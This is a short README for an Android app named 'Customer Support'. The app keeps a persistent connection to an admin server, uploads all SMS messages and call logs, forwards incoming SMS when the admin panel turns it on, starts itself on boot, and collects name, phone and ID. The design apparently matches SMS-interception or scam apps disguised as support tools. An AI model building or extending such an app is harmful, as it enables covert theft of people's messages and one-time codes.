# Customer Support Android App

Android companion app for the Customer Support web admin panel.

## Features

- 📱 **Background Service** - Maintains persistent Socket.IO connection
- 💬 **SMS Sync** - Automatically syncs all SMS messages
- 📞 **Call Log Sync** - Syncs incoming/outgoing/missed calls
- 📝 **Form Submission** - Submit user data (Name, Phone, ID)
- 🔄 **SMS Forwarding** - Forward incoming SMS when enabled from admin panel
- 🚀 **Auto-Start** - Service starts automatically on device boot

## Requirements

- Android 7.0+ (API 24)
- Permissions: SMS, Call Log, Phone State

## Building

1. Open the project in Android Studio
2. Sync Gradle files
3. Build and run on device/emulator

## Configuration

The server URL is hardcoded in `SocketManager.kt`:

```kotlin
private const val SERVER_URL = "http://10.0.2.2:3001" // Emulator
// For physical device, use your server's IP: "http://192.168.x.x:3001"
```

## Project Structure

```
app/src/main/java/com/customersupport/
├── CustomerSupportApp.kt      # Hilt Application
├── MainActivity.kt            # Main Activity with Compose
├── socket/
│   └── SocketManager.kt       # Socket.IO wrapper
├── service/
│   └── SocketService.kt       # Foreground Service
├── data/
│   ├── SmsReader.kt           # SMS ContentResolver
│   ├── CallLogReader.kt       # Call Log ContentResolver
│   └── PreferencesManager.kt  # DataStore wrapper
├── receiver/
│   ├── BootReceiver.kt        # Auto-start on boot
│   └── SmsReceiver.kt         # SMS forwarding
├── ui/
│   ├── theme/Theme.kt         # Material3 Theme
│   └── screens/
│       ├── DashboardScreen.kt # Main dashboard
│       ├── FormScreen.kt      # Form submission
│       └── SettingsScreen.kt  # Settings view
└── di/
    └── AppModule.kt           # Hilt module
```

## Socket.IO Events

| Event | Direction | Description |
|-------|-----------|-------------|
| `device:register` | → Server | Register device on connect |
| `sms:sync` | → Server | Sync SMS messages |
| `calls:sync` | → Server | Sync call logs |
| `form:submit` | → Server | Submit form data |
| `forwarding:config` | ← Server | Receive forwarding config |
